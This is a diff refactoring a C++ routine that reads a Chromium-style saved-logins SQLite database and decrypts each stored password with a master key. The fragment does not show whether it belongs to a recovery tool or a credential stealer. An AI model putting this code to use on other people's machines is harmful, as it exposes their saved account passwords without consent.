@@ -32,24 +32,9 @@ void CPasswords::execute(const fs::path &root, const std::string &name, const fs
 }
 
 std::list<Login> CPasswords::getPasswords(const fs::path &db_path) {
-    std::list<Login> passwordList;
-    sqlite3* db;
-    sqlite3_stmt* stmt;
-    int rc;
+    std::list<Login> passwords;
 
-    rc = sqlite3_open(db_path.string().c_str(), &db);
-    if (rc) {
-        return {};
-    }
-
-    const char* sql = "SELECT origin_url, username_value, password_value FROM logins ORDER BY times_used DESC";
-    rc = sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr);
-    if (rc != SQLITE_OK) {
-        sqlite3_close(db);
-        return {};
-    }
-
-    while ((rc = sqlite3_step(stmt)) == SQLITE_ROW) {
+    SQLiteUtil::connectAndRead("SELECT origin_url, username_value, password_value FROM logins ORDER BY times_used DESC", db_path, [this, &passwords](sqlite3_stmt *stmt) {
         const unsigned char* origin_url = sqlite3_column_text(stmt, 0);
         const unsigned char* username_value = sqlite3_column_text(stmt, 1);
         const void* password_value = sqlite3_column_blob(stmt, 2);
@@ -66,11 +51,8 @@ std::list<Login> CPasswords::getPasswords(const fs::path &db_path) {
         std::string decoded_password = ChromiumUtil::decryptData(password_encrypted, master_key);
         password_record.password = decoded_password;
 
-        passwordList.push_back(password_record);
-    }
+        passwords.push_back(password_record);
+    });
 
-    sqlite3_finalize(stmt);
-    sqlite3_close(db);
-
-    return passwordList;
+    return passwords;
 }
